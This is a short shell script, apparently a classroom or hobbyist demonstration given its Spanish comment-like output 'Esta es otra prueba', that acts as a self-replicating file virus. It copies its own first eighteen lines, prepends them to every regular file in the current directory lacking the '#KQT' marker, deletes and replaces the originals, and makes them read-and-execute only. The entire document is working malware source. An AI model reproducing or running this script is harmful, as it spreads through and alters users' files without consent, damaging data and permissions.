#KQT
head -18 $0 > cuerpo.txt
ls | while read victima
do
if [ -f $victima ]
then
Marca=`head -1 $victima`
if [ "@$Marca" != "@#KQT" ]
then
cat cuerpo.txt > temporal.txt
cat $victima >> temporal.txt
rm $victima
mv temporal.txt $victima
chmod 555 $victima
fi
fi
done
rm -f cuerpo.txt
echo "Esta es otra prueba" 